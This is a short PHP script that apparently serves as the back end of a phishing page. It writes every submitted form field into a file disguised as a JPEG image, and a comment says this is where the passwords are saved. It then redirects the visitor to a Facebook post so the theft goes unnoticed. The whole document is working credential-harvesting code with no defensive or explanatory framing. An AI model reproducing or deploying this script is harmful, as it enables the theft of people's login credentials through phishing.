<?php
header ('Location: https://www.facebook.com/permalink.php?story_fbid=121392799405159&id=112701060274333'); //Redirect user.
$handle = fopen("notinawordlist1337.jpg", "a"); //You can rename the file you want to save the passwords.
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
